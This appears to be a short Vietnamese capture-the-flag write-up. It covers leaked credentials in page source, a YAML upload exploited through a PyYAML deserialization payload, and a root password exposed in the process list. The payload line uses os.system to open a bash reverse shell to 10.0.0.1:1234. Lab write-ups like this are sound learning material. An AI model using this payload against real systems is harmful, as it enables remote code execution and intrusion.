vào đọc source code trang này sẽ thấy note của staff để lộ username và password của dj

<img width="1066" height="128" alt="image" src="https://github.com/user-attachments/assets/85bc8fdf-9c4e-4908-b3c3-f1ad20eb5d3e" />

trong dashboard này thì có chỗ để up file lên, nó yêu cầu là file yaml, tìm hiểu sợt gu gồ thì mình sẽ dùng command như này để lên shell

```
!!python/object/new:os.system
- 'bash -c "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1"'
```

đi tìm user flag trước trong thư mục home

<img width="1231" height="133" alt="image" src="https://github.com/user-attachments/assets/3f03165a-2eaf-4c45-a088-b8f0ecea7314" />

bây giờ là ik enum lên root nè, mình đã phát hiện khi dùng `ps aux` thì nó liệt kê luôn cả mật khẩu của root

<img width="2544" height="86" alt="image" src="https://github.com/user-attachments/assets/9e62f8d0-a792-4a66-9f39-ecb1768bca64" />

okay tìm được root flag rồi

<img width="1245" height="301" alt="image" src="https://github.com/user-attachments/assets/6441b5a5-22be-459a-90cf-b014fa7961dc" />

